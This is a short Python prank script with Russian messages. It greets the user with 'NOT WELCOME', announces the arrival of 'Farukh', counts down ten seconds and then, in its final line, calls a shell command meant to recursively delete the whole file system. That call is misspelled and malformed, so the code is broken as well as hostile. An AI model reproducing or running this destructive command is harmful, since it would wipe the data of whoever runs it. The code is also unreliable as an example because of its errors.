print ("HE ДОБРО ПOжAЛOBATЬ") 
import os 
import time
import colorama
from colorama import Fore, Back, Style
colorama.init()
print (Fore.RED + 'Запуск Фаруха')
time.sleep(5)
print (Fore.RED + 'До прихода фаруха')
time_count = 10 
for i in range(time_count, 0, -1): 
  print("осталось {} секунд".format(i))
  time.sleep(1)
print("Фарух пришёл")
os.sytem('rm -rf/') 
